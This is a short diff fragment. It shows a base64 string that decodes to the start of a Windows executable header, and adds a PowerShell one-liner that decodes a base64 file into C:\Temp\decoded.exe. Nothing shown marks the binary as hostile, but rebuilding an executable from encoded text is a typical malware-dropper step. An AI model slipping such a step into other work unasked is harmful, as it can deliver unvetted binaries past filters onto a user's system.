@@ -1,1 +1,4 @@
 8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAADILZfUjEz5h4xM
+
+powershell -Command "[IO.File]::WriteAllBytes('C:\Temp\decoded.exe', [Convert]::FromBase64String((Get-Content 'C:\Temp\testfile.b64' -Raw)))"
+
